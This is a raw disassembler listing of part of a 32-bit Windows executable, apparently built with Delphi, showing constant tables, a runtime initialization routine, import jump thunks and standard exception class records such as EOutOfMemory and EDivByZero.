  4042de:	00 00                	add    %al,(%eax)
  4042e0:	00 00                	add    %al,(%eax)
  4042e2:	00 c8                	add    %cl,%al
  4042e4:	05 40 00 00 00       	add    $0x40,%eax
  4042e9:	00 00                	add    %al,(%eax)
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	fa                   	cli
  4042ee:	08 40 00             	or     %al,0x0(%eax)
  4042f1:	00 00                	add    %al,(%eax)
  4042f3:	00 00                	add    %al,(%eax)
  4042f5:	00 40 9c             	add    %al,-0x64(%eax)
  4042f8:	0c 40                	or     $0x40,%al
  4042fa:	00 00                	add    %al,(%eax)
  4042fc:	00 00                	add    %al,(%eax)
  4042fe:	00 00                	add    %al,(%eax)
  404300:	50                   	push   %eax
  404301:	c3                   	ret
  404302:	0f 40 00             	cmovo  (%eax),%eax
  404305:	00 00                	add    %al,(%eax)
  404307:	00 00                	add    %al,(%eax)
  404309:	00 24 f4             	add    %ah,(%esp,%esi,8)
  40430c:	12 40 00             	adc    0x0(%eax),%al
  40430f:	00 00                	add    %al,(%eax)
  404311:	00 00                	add    %al,(%eax)
  404313:	80 96 98 16 40 00 00 	adcb   $0x0,0x401698(%esi)
  40431a:	00 00                	add    %al,(%eax)
  40431c:	00 20                	add    %ah,(%eax)
  40431e:	bc be 19 40 00       	mov    $0x4019be,%esp
  404323:	00 00                	add    %al,(%eax)
  404325:	00 00                	add    %al,(%eax)
  404327:	28 6b ee             	sub    %ch,-0x12(%ebx)
  40432a:	1c 40                	sbb    $0x40,%al
  40432c:	00 00                	add    %al,(%eax)
  40432e:	00 00                	add    %al,(%eax)
  404330:	00 f9                	add    %bh,%cl
  404332:	02 95 20 40 00 00    	add    0x4020(%ebp),%dl
  404338:	00 00                	add    %al,(%eax)
  40433a:	40                   	inc    %eax
  40433b:	b7 43                	mov    $0x43,%bh
  40433d:	ba 23 40 00 00       	mov    $0x4023,%edx
  404342:	00 00                	add    %al,(%eax)
  404344:	10 a5 d4 e8 26 40    	adc    %ah,0x4026e8d4(%ebp)
  40434a:	00 00                	add    %al,(%eax)
  40434c:	00 00                	add    %al,(%eax)
  40434e:	2a e7                	sub    %bh,%ah
  404350:	84 91 2a 40 00 00    	test   %dl,0x402a(%ecx)
  404356:	00 80 f4 20 e6 b5    	add    %al,-0x4a19df0c(%eax)
  40435c:	2d 40 00 00 00       	sub    $0x40,%eax
  404361:	a0 31 a9 5f e3       	mov    0xe35fa931,%al
  404366:	30 40 00             	xor    %al,0x0(%eax)
  404369:	00 00                	add    %al,(%eax)
  40436b:	04 bf                	add    $0xbf,%al
  40436d:	c9                   	leave
  40436e:	1b 8e 34 40 00 00    	sbb    0x4034(%esi),%ecx
  404374:	00 c5                	add    %al,%ch
  404376:	2e bc a2 b1 37 40    	cs mov $0x4037b1a2,%esp
  40437c:	00 00                	add    %al,(%eax)
  40437e:	40                   	inc    %eax
  40437f:	76 3a                	jbe    0x4043bb
  404381:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  404384:	3a 40 00             	cmp    0x0(%eax),%al
  404387:	00 e8                	add    %ch,%al
  404389:	89 04 23             	mov    %eax,(%ebx,%eiz,1)
  40438c:	c7                   	(bad)
  40438d:	8a 3e                	mov    (%esi),%bh
  40438f:	40                   	inc    %eax
  404390:	00 00                	add    %al,(%eax)
  404392:	62 ac c5 eb 78 ad 41 	bound  %ebp,0x41ad78eb(%ebp,%eax,8)
  404399:	40                   	inc    %eax
  40439a:	00 80 7a 17 b7 26    	add    %al,0x26b7177a(%eax)
  4043a0:	d7                   	xlat   %ds:(%ebx)
  4043a1:	d8 44 40 00          	fadds  0x0(%eax,%eax,2)
  4043a5:	90                   	nop
  4043a6:	ac                   	lods   %ds:(%esi),%al
  4043a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4043a8:	32 78 86             	xor    -0x7a(%eax),%bh
  4043ab:	87 48 40             	xchg   %ecx,0x40(%eax)
  4043ae:	00 b4 57 0a 3f 16 68 	add    %dh,0x68163f0a(%edi,%edx,2)
  4043b5:	a9 4b 40 00 a1       	test   $0xa100404b,%eax
  4043ba:	ed                   	in     (%dx),%eax
  4043bb:	cc                   	int3
  4043bc:	ce                   	into
  4043bd:	1b c2                	sbb    %edx,%eax
  4043bf:	d3 4e 40             	rorl   %cl,0x40(%esi)
  4043c2:	a0 84 14 40 61       	mov    0x61401484,%al
  4043c7:	51                   	push   %ecx
  4043c8:	59                   	pop    %ecx
  4043c9:	84 52 40             	test   %dl,0x40(%edx)
  4043cc:	c8 a5 19 90          	enter  $0x19a5,$0x90
  4043d0:	b9 a5 6f a5 55       	mov    $0x55a56fa5,%ecx
  4043d5:	40                   	inc    %eax
  4043d6:	3a 0f                	cmp    (%edi),%cl
  4043d8:	20 f4                	and    %dh,%ah
  4043da:	27                   	daa
  4043db:	8f                   	(bad)
  4043dc:	cb                   	lret
  4043dd:	ce                   	into
  4043de:	58                   	pop    %eax
  4043df:	40                   	inc    %eax
  4043e0:	84 09                	test   %cl,(%ecx)
  4043e2:	94                   	xchg   %eax,%esp
  4043e3:	f8                   	clc
  4043e4:	78 39                	js     0x40441f
  4043e6:	3f                   	aas
  4043e7:	81 5c 40 e5 0b b9 36 	sbbl   $0xd736b90b,-0x1b(%eax,%eax,2)
  4043ee:	d7 
  4043ef:	07                   	pop    %es
  4043f0:	8f                   	(bad)
  4043f1:	a1 5f 40 df 4e       	mov    0x4edf405f,%eax
  4043f6:	67 04 cd             	addr16 add $0xcd,%al
  4043f9:	c9                   	leave
  4043fa:	f2 c9                	repnz leave
  4043fc:	62 40 96             	bound  %eax,-0x6a(%eax)
  4043ff:	22 81 45 40 7c 6f    	and    0x6f7c4045(%ecx),%al
  404405:	fc                   	cld
  404406:	65 40                	gs inc %eax
  404408:	9e                   	sahf
  404409:	b5 70                	mov    $0x70,%ch
  40440b:	2b a8 ad c5 9d 69    	sub    0x699dc5ad(%eax),%ebp
  404411:	40                   	inc    %eax
  404412:	d5 a6                	aad    $0xa6
  404414:	cf                   	iret
  404415:	ff 49 1f             	decl   0x1f(%ecx)
  404418:	78 c2                	js     0x4043dc
  40441a:	d3 40 a3             	roll   %cl,-0x5d(%eax)
  40441d:	14 9b                	adc    $0x9b,%al
  40441f:	c5 16                	lds    (%esi),%edx
  404421:	ab                   	stos   %eax,%es:(%edi)
  404422:	b3 ef                	mov    $0xef,%bl
  404424:	3d 41 e0 8c e9       	cmp    $0xe98ce041,%eax
  404429:	80 c9 47             	or     $0x47,%cl
  40442c:	ba 93 a8 41 aa       	mov    $0xaa41a893,%edx
  404431:	17                   	pop    %ss
  404432:	e6 7f                	out    %al,$0x7f
  404434:	2b a1 16 b6 12 42    	sub    0x4212b616(%ecx),%esp
  40443a:	6b 55 27 39          	imul   $0x39,0x27(%ebp),%edx
  40443e:	8d                   	lea    (bad),%esi
  40443f:	f7 70 e0             	divl   -0x20(%eax)
  404442:	7c 42                	jl     0x404486
  404444:	30 c9                	xor    %cl,%cl
  404446:	3c e3                	cmp    $0xe3,%al
  404448:	ff 96 52 8a e7 42    	call   *0x42e78a52(%esi)
  40444e:	8e de                	mov    %esi,%ds
  404450:	f9                   	stc
  404451:	9d                   	popf
  404452:	fb                   	sti
  404453:	eb 7e                	jmp    0x4044d3
  404455:	aa                   	stos   %al,%es:(%edi)
  404456:	51                   	push   %ecx
  404457:	43                   	inc    %ebx
  404458:	8c 2f                	mov    %gs,(%edi)
  40445a:	6a 5c                	push   $0x5c
  40445c:	19 fc                	sbb    %edi,%esp
  40445e:	26 d2 bb 43 76 e3 cc 	sarb   %cl,%es:-0x331c89bd(%ebx)
  404465:	f2 29 2f             	repnz sub %ebp,(%edi)
  404468:	84 81 26 44 d2 0a    	test   %al,0xad24426(%ecx)
  40446e:	90                   	nop
  40446f:	db 00                	fildl  (%eax)
  404471:	27                   	daa
  404472:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404473:	9f                   	lahf
  404474:	90                   	nop
  404475:	44                   	inc    %esp
  404476:	17                   	pop    %ss
  404477:	aa                   	stos   %al,%es:(%edi)
  404478:	f8                   	clc
  404479:	ae                   	scas   %es:(%edi),%al
  40447a:	10 e3                	adc    %ah,%bl
  40447c:	c5 c4 fa             	(bad)
  40447f:	44                   	inc    %esp
  404480:	59                   	pop    %ecx
  404481:	9c                   	pushf
  404482:	b0 e9                	mov    $0xe9,%al
  404484:	07                   	pop    %es
  404485:	9c                   	pushf
  404486:	8a f2                	mov    %dl,%dh
  404488:	64 45                	fs inc %ebp
  40448a:	d4 f3                	aam    $0xf3
  40448c:	f7 eb                	imul   %ebx
  40448e:	e1 4a                	loope  0x4044da
  404490:	7a 95                	jp     0x404427
  404492:	cf                   	iret
  404493:	45                   	inc    %ebp
  404494:	62 a2 95 07 dc d8    	bound  %esp,-0x2723f86b(%edx)
  40449a:	3e b8 39 46 c7 91    	ds mov $0x91c74639,%eax
  4044a0:	0e                   	push   %cs
  4044a1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4044a2:	ae                   	scas   %es:(%edi),%al
  4044a3:	a0 19 e3 a3 46       	mov    0x46a3e319,%al
  4044a8:	17                   	pop    %ss
  4044a9:	0c 75                	or     $0x75,%al
  4044ab:	81 86 75 76 c9 48 4d 	addl   $0x93a7e44d,0x48c97675(%esi)
  4044b2:	e4 a7 93 
  4044b5:	39 3b                	cmp    %edi,(%ebx)
  4044b7:	35 b8 b2 ed 53       	xor    $0x53edb2b8,%eax
  4044bc:	e5 5d                	in     $0x5d,%eax
  4044be:	3d c5 5d 3b 8b       	cmp    $0x8b3b5dc5,%eax
  4044c3:	9e                   	sahf
  4044c4:	92                   	xchg   %eax,%edx
  4044c5:	5a                   	pop    %edx
  4044c6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4044c7:	f0 a1 20 c0 54 a5    	lock mov 0xa554c020,%eax
  4044cd:	8c 37                	mov    %?,(%edi)
  4044cf:	61                   	popa
  4044d0:	8b 5a 8b             	mov    -0x75(%edx),%ebx
  4044d3:	d8 25 5d 89 f9 db    	fsubs  0xdbf9895d
  4044d9:	67 f8                	addr16 clc
  4044db:	f3 27                	repz daa
  4044dd:	bf a2 c8 5d dd       	mov    $0xdd5dc8a2,%edi
  4044e2:	80 6e 9b 97          	subb   $0x97,-0x65(%esi)
  4044e6:	20 8a 02 52 60 c4    	and    %cl,-0x3b9fadfe(%edx)
  4044ec:	25 75 f0 59 d5       	and    $0xd559f075,%eax
  4044f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4044f2:	62 11                	bound  %edx,(%ecx)
  4044f4:	35 ae ca 7b 55       	xor    $0x557bcaae,%eax
  4044f9:	8b ec                	mov    %esp,%ebp
  4044fb:	53                   	push   %ebx
  4044fc:	56                   	push   %esi
  4044fd:	57                   	push   %edi
  4044fe:	33 c0                	xor    %eax,%eax
  404500:	55                   	push   %ebp
  404501:	68 9a 45 40 00       	push   $0x40459a
  404506:	64 ff 30             	push   %fs:(%eax)
  404509:	64 89 20             	mov    %esp,%fs:(%eax)
  40450c:	a1 d0 c3 40 00       	mov    0x40c3d0,%eax
  404511:	c1 e0 02             	shl    $0x2,%eax
  404514:	a3 d4 c3 40 00       	mov    %eax,0x40c3d4
  404519:	33 c0                	xor    %eax,%eax
  40451b:	a3 20 c0 40 00       	mov    %eax,0x40c020
  404520:	33 c0                	xor    %eax,%eax
  404522:	a3 24 c0 40 00       	mov    %eax,0x40c024
  404527:	33 c0                	xor    %eax,%eax
  404529:	a3 28 c0 40 00       	mov    %eax,0x40c028
  40452e:	e8 79 eb ff ff       	call   0x4030ac
  404533:	33 d2                	xor    %edx,%edx
  404535:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  40453b:	33 c0                	xor    %eax,%eax
  40453d:	a3 2c c0 40 00       	mov    %eax,0x40c02c
  404542:	c6 05 33 c0 40 00 02 	movb   $0x2,0x40c033
  404549:	c6 05 34 c0 40 00 02 	movb   $0x2,0x40c034
  404550:	c6 05 35 c0 40 00 03 	movb   $0x3,0x40c035
  404557:	66 c7 05 dc c3 40 00 	movw   $0x0,0x40c3dc
  40455e:	00 00 
  404560:	66 c7 05 ec c3 40 00 	movw   $0x1,0x40c3ec
  404567:	01 00 
  404569:	e8 96 e3 ff ff       	call   0x402904
  40456e:	b8 38 c0 40 00       	mov    $0x40c038,%eax
  404573:	ba a8 45 40 00       	mov    $0x4045a8,%edx
  404578:	e8 0c f7 ff ff       	call   0x403c89
  40457d:	b8 04 c2 40 00       	mov    $0x40c204,%eax
  404582:	ba a8 45 40 00       	mov    $0x4045a8,%edx
  404587:	e8 fd f6 ff ff       	call   0x403c89
  40458c:	33 c0                	xor    %eax,%eax
  40458e:	5a                   	pop    %edx
  40458f:	59                   	pop    %ecx
  404590:	59                   	pop    %ecx
  404591:	64 89 10             	mov    %edx,%fs:(%eax)
  404594:	68 a1 45 40 00       	push   $0x4045a1
  404599:	c3                   	ret
  40459a:	e9 c1 e7 ff ff       	jmp    0x402d60
  40459f:	eb f8                	jmp    0x404599
  4045a1:	5f                   	pop    %edi
  4045a2:	5e                   	pop    %esi
  4045a3:	5b                   	pop    %ebx
  4045a4:	5d                   	pop    %ebp
  4045a5:	c3                   	ret
  4045a6:	00 00                	add    %al,(%eax)
  4045a8:	00 00                	add    %al,(%eax)
  4045aa:	00 00                	add    %al,(%eax)
  4045ac:	ff 25 50 c1 41 00    	jmp    *0x41c150
  4045b2:	8b c0                	mov    %eax,%eax
  4045b4:	ff 25 4c c1 41 00    	jmp    *0x41c14c
  4045ba:	8b c0                	mov    %eax,%eax
  4045bc:	ff 25 48 c1 41 00    	jmp    *0x41c148
  4045c2:	8b c0                	mov    %eax,%eax
  4045c4:	ff 25 44 c1 41 00    	jmp    *0x41c144
  4045ca:	8b c0                	mov    %eax,%eax
  4045cc:	ff 25 40 c1 41 00    	jmp    *0x41c140
  4045d2:	8b c0                	mov    %eax,%eax
  4045d4:	ff 25 3c c1 41 00    	jmp    *0x41c13c
  4045da:	8b c0                	mov    %eax,%eax
  4045dc:	ff 25 b8 c1 41 00    	jmp    *0x41c1b8
  4045e2:	8b c0                	mov    %eax,%eax
  4045e4:	ff 25 b4 c1 41 00    	jmp    *0x41c1b4
  4045ea:	8b c0                	mov    %eax,%eax
  4045ec:	ff 25 b0 c1 41 00    	jmp    *0x41c1b0
  4045f2:	8b c0                	mov    %eax,%eax
  4045f4:	ff 25 ac c1 41 00    	jmp    *0x41c1ac
  4045fa:	8b c0                	mov    %eax,%eax
  4045fc:	ff 25 a8 c1 41 00    	jmp    *0x41c1a8
  404602:	8b c0                	mov    %eax,%eax
  404604:	ff 25 a4 c1 41 00    	jmp    *0x41c1a4
  40460a:	8b c0                	mov    %eax,%eax
  40460c:	ff 25 a0 c1 41 00    	jmp    *0x41c1a0
  404612:	8b c0                	mov    %eax,%eax
  404614:	ff 25 9c c1 41 00    	jmp    *0x41c19c
  40461a:	8b c0                	mov    %eax,%eax
  40461c:	ff 25 98 c1 41 00    	jmp    *0x41c198
  404622:	8b c0                	mov    %eax,%eax
  404624:	ff 25 94 c1 41 00    	jmp    *0x41c194
  40462a:	8b c0                	mov    %eax,%eax
  40462c:	ff 25 90 c1 41 00    	jmp    *0x41c190
  404632:	8b c0                	mov    %eax,%eax
  404634:	ff 25 8c c1 41 00    	jmp    *0x41c18c
  40463a:	8b c0                	mov    %eax,%eax
  40463c:	ff 25 88 c1 41 00    	jmp    *0x41c188
  404642:	8b c0                	mov    %eax,%eax
  404644:	ff 25 84 c1 41 00    	jmp    *0x41c184
  40464a:	8b c0                	mov    %eax,%eax
  40464c:	ff 25 80 c1 41 00    	jmp    *0x41c180
  404652:	8b c0                	mov    %eax,%eax
  404654:	ff 25 7c c1 41 00    	jmp    *0x41c17c
  40465a:	8b c0                	mov    %eax,%eax
  40465c:	ff 25 78 c1 41 00    	jmp    *0x41c178
  404662:	8b c0                	mov    %eax,%eax
  404664:	ff 25 74 c1 41 00    	jmp    *0x41c174
  40466a:	8b c0                	mov    %eax,%eax
  40466c:	ff 25 70 c1 41 00    	jmp    *0x41c170
  404672:	8b c0                	mov    %eax,%eax
  404674:	ff 25 6c c1 41 00    	jmp    *0x41c16c
  40467a:	8b c0                	mov    %eax,%eax
  40467c:	ff 25 68 c1 41 00    	jmp    *0x41c168
  404682:	8b c0                	mov    %eax,%eax
  404684:	ff 25 64 c1 41 00    	jmp    *0x41c164
  40468a:	8b c0                	mov    %eax,%eax
  40468c:	ff 25 60 c1 41 00    	jmp    *0x41c160
  404692:	8b c0                	mov    %eax,%eax
  404694:	ff 25 5c c1 41 00    	jmp    *0x41c15c
  40469a:	8b c0                	mov    %eax,%eax
  40469c:	ff 25 58 c1 41 00    	jmp    *0x41c158
  4046a2:	8b c0                	mov    %eax,%eax
  4046a4:	ff 25 c4 c1 41 00    	jmp    *0x41c1c4
  4046aa:	8b c0                	mov    %eax,%eax
  4046ac:	ff 25 c0 c1 41 00    	jmp    *0x41c1c0
  4046b2:	8b c0                	mov    %eax,%eax
  4046b4:	0e                   	push   %cs
  4046b5:	0a 54 53 65          	or     0x65(%ebx,%edx,2),%dl
  4046b9:	61                   	popa
  4046ba:	72 63                	jb     0x40471f
  4046bc:	68 52 65 63 58       	push   $0x58636552
  4046c1:	01 00                	add    %eax,(%eax)
  4046c3:	00 01                	add    %al,(%ecx)
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	00 00                	add    %al,(%eax)
  4046c9:	10 40 00             	adc    %al,0x0(%eax)
  4046cc:	0c 00                	or     $0x0,%al
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	00 00                	add    %al,(%eax)
  4046d4:	04 47                	add    $0x47,%al
  4046d6:	40                   	inc    %eax
	...
  4046e7:	00 16                	add    %dl,(%esi)
  4046e9:	47                   	inc    %edi
  4046ea:	40                   	inc    %eax
  4046eb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4046ee:	00 00                	add    %al,(%eax)
  4046f0:	3c 10                	cmp    $0x10,%al
  4046f2:	40                   	inc    %eax
  4046f3:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4046f7:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4046fb:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4046ff:	00 c0                	add    %al,%al
  404701:	29 40 00             	sub    %eax,0x0(%eax)
  404704:	0e                   	push   %cs
  404705:	00 00                	add    %al,(%eax)
  404707:	00 00                	add    %al,(%eax)
  404709:	00 01                	add    %al,(%ecx)
  40470b:	00 00                	add    %al,(%eax)
  40470d:	00 00                	add    %al,(%eax)
  40470f:	10 40 00             	adc    %al,0x0(%eax)
  404712:	04 00                	add    $0x0,%al
  404714:	00 00                	add    %al,(%eax)
  404716:	09 45 78             	or     %eax,0x78(%ebp)
  404719:	63 65 70             	arpl   %esp,0x70(%ebp)
  40471c:	74 69                	je     0x404787
  40471e:	6f                   	outsl  %ds:(%esi),(%dx)
  40471f:	6e                   	outsb  %ds:(%esi),(%dx)
	...
  404738:	54                   	push   %esp
  404739:	47                   	inc    %edi
  40473a:	40                   	inc    %eax
  40473b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40473e:	00 00                	add    %al,(%eax)
  404740:	04 47                	add    $0x47,%al
  404742:	40                   	inc    %eax
  404743:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404747:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40474b:	00 34 69             	add    %dh,(%ecx,%ebp,2)
  40474e:	40                   	inc    %eax
  40474f:	00 28                	add    %ch,(%eax)
  404751:	69 40 00 0c 45 4f 75 	imul   $0x754f450c,0x0(%eax),%eax
  404758:	74 4f                	je     0x4047a9
  40475a:	66 4d                	dec    %bp
  40475c:	65 6d                	gs insl (%dx),%es:(%edi)
  40475e:	6f                   	outsl  %ds:(%esi),(%dx)
  40475f:	72 79                	jb     0x4047da
  404761:	8d 40 00             	lea    0x0(%eax),%eax
	...
  40477c:	98                   	cwtl
  40477d:	47                   	inc    %edi
  40477e:	40                   	inc    %eax
  40477f:	00 10                	add    %dl,(%eax)
  404781:	00 00                	add    %al,(%eax)
  404783:	00 04 47             	add    %al,(%edi,%eax,2)
  404786:	40                   	inc    %eax
  404787:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40478b:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40478f:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404793:	00 c0                	add    %al,%al
  404795:	29 40 00             	sub    %eax,0x0(%eax)
  404798:	0b 45 49             	or     0x49(%ebp),%eax
  40479b:	6e                   	outsb  %ds:(%esi),(%dx)
  40479c:	4f                   	dec    %edi
  40479d:	75 74                	jne    0x404813
  40479f:	45                   	inc    %ebp
  4047a0:	72 72                	jb     0x404814
  4047a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a3:	72 00                	jb     0x4047a5
	...
  4047b9:	00 00                	add    %al,(%eax)
  4047bb:	00 d8                	add    %bl,%al
  4047bd:	47                   	inc    %edi
  4047be:	40                   	inc    %eax
  4047bf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4047c2:	00 00                	add    %al,(%eax)
  4047c4:	04 47                	add    $0x47,%al
  4047c6:	40                   	inc    %eax
  4047c7:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4047cb:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4047cf:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4047d3:	00 c0                	add    %al,%al
  4047d5:	29 40 00             	sub    %eax,0x0(%eax)
  4047d8:	09 45 49             	or     %eax,0x49(%ebp)
  4047db:	6e                   	outsb  %ds:(%esi),(%dx)
  4047dc:	74 45                	je     0x404823
  4047de:	72 72                	jb     0x404852
  4047e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4047e1:	72 8b                	jb     0x40476e
  4047e3:	c0 00 00             	rolb   $0x0,(%eax)
	...
  4047fa:	00 00                	add    %al,(%eax)
  4047fc:	18 48 40             	sbb    %cl,0x40(%eax)
  4047ff:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404802:	00 00                	add    %al,(%eax)
  404804:	d8 47 40             	fadds  0x40(%edi)
  404807:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40480b:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40480f:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404813:	00 c0                	add    %al,%al
  404815:	29 40 00             	sub    %eax,0x0(%eax)
  404818:	0a 45 44             	or     0x44(%ebp),%al
  40481b:	69 76 42 79 5a 65 72 	imul   $0x72655a79,0x42(%esi),%esi
  404822:	6f                   	outsl  %ds:(%esi),(%dx)
  404823:	90                   	nop
	...
  40483c:	58                   	pop    %eax
  40483d:	48                   	dec    %eax
  40483e:	40                   	inc    %eax
  40483f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404842:	00 00                	add    %al,(%eax)
  404844:	d8 47 40             	fadds  0x40(%edi)
  404847:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40484b:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40484f:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404853:	00 c0                	add    %al,%al
  404855:	29 40 00             	sub    %eax,0x0(%eax)
  404858:	0b 45 52             	or     0x52(%ebp),%eax
  40485b:	61                   	popa
  40485c:	6e                   	outsb  %ds:(%esi),(%dx)
  40485d:	67 65 45             	addr16 gs inc %ebp
  404860:	72 72                	jb     0x4048d4
  404862:	6f                   	outsl  %ds:(%esi),(%dx)
  404863:	72 00                	jb     0x404865
	...
  404879:	00 00                	add    %al,(%eax)
  40487b:	00 98 48 40 00 0c    	add    %bl,0xc004048(%eax)
  404881:	00 00                	add    %al,(%eax)
  404883:	00 d8                	add    %bl,%al
  404885:	47                   	inc    %edi
  404886:	40                   	inc    %eax
  404887:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40488b:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40488f:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404893:	00 c0                	add    %al,%al
  404895:	29 40 00             	sub    %eax,0x0(%eax)
  404898:	0c 45                	or     $0x45,%al
  40489a:	49                   	dec    %ecx
  40489b:	6e                   	outsb  %ds:(%esi),(%dx)
  40489c:	74 4f                	je     0x4048ed
  40489e:	76 65                	jbe    0x404905
  4048a0:	72 66                	jb     0x404908
  4048a2:	6c                   	insb   (%dx),%es:(%edi)
  4048a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4048a4:	77 8d                	ja     0x404833
  4048a6:	40                   	inc    %eax
	...
  4048bf:	00 dc                	add    %bl,%ah
  4048c1:	48                   	dec    %eax
  4048c2:	40                   	inc    %eax
  4048c3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4048c6:	00 00                	add    %al,(%eax)
  4048c8:	04 47                	add    $0x47,%al
  4048ca:	40                   	inc    %eax
  4048cb:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4048cf:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4048d3:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4048d7:	00 c0                	add    %al,%al
  4048d9:	29 40 00             	sub    %eax,0x0(%eax)
  4048dc:	0a 45 4d             	or     0x4d(%ebp),%al
  4048df:	61                   	popa
  4048e0:	74 68                	je     0x40494a
  4048e2:	45                   	inc    %ebp
  4048e3:	72 72                	jb     0x404957
  4048e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4048e6:	72 90                	jb     0x404878
	...
  404900:	1c 49                	sbb    $0x49,%al
  404902:	40                   	inc    %eax
  404903:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404906:	00 00                	add    %al,(%eax)
  404908:	dc 48 40             	fmull  0x40(%eax)
  40490b:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40490f:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404913:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404917:	00 c0                	add    %al,%al
  404919:	29 40 00             	sub    %eax,0x0(%eax)
  40491c:	0a 45 49             	or     0x49(%ebp),%al
  40491f:	6e                   	outsb  %ds:(%esi),(%dx)
  404920:	76 61                	jbe    0x404983
  404922:	6c                   	insb   (%dx),%es:(%edi)
  404923:	69 64 4f 70 90 00 00 	imul   $0x90,0x70(%edi,%ecx,2),%esp
  40492a:	00 
	...
  40493f:	00 5c 49 40          	add    %bl,0x40(%ecx,%ecx,2)
  404943:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404946:	00 00                	add    %al,(%eax)
  404948:	dc 48 40             	fmull  0x40(%eax)
  40494b:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40494f:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404953:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404957:	00 c0                	add    %al,%al
  404959:	29 40 00             	sub    %eax,0x0(%eax)
  40495c:	0b 45 5a             	or     0x5a(%ebp),%eax
  40495f:	65 72 6f             	gs jb  0x4049d1
  404962:	44                   	inc    %esp
  404963:	69 76 69 64 65 00 00 	imul   $0x6564,0x69(%esi),%esi
	...
  40497e:	00 00                	add    %al,(%eax)
  404980:	9c                   	pushf
  404981:	49                   	dec    %ecx
  404982:	40                   	inc    %eax
  404983:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404986:	00 00                	add    %al,(%eax)
  404988:	dc 48 40             	fmull  0x40(%eax)
  40498b:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40498f:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404993:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404997:	00 c0                	add    %al,%al
  404999:	29 40 00             	sub    %eax,0x0(%eax)
  40499c:	09 45 4f             	or     %eax,0x4f(%ebp)
  40499f:	76 65                	jbe    0x404a06
  4049a1:	72 66                	jb     0x404a09
  4049a3:	6c                   	insb   (%dx),%es:(%edi)
  4049a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049a5:	77 8b                	ja     0x404932
  4049a7:	c0 00 00             	rolb   $0x0,(%eax)
	...
  4049be:	00 00                	add    %al,(%eax)
  4049c0:	dc 49 40             	fmull  0x40(%ecx)
  4049c3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4049c6:	00 00                	add    %al,(%eax)
  4049c8:	dc 48 40             	fmull  0x40(%eax)
  4049cb:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4049cf:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4049d3:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4049d7:	00 c0                	add    %al,%al
  4049d9:	29 40 00             	sub    %eax,0x0(%eax)
  4049dc:	0a 45 55             	or     0x55(%ebp),%al
  4049df:	6e                   	outsb  %ds:(%esi),(%dx)
  4049e0:	64 65 72 66          	fs gs jb 0x404a4a
  4049e4:	6c                   	insb   (%dx),%es:(%edi)
  4049e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e6:	77 90                	ja     0x404978
	...
  404a00:	1c 4a                	sbb    $0x4a,%al
  404a02:	40                   	inc    %eax
  404a03:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a06:	00 00                	add    %al,(%eax)
  404a08:	04 47                	add    $0x47,%al
  404a0a:	40                   	inc    %eax
  404a0b:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
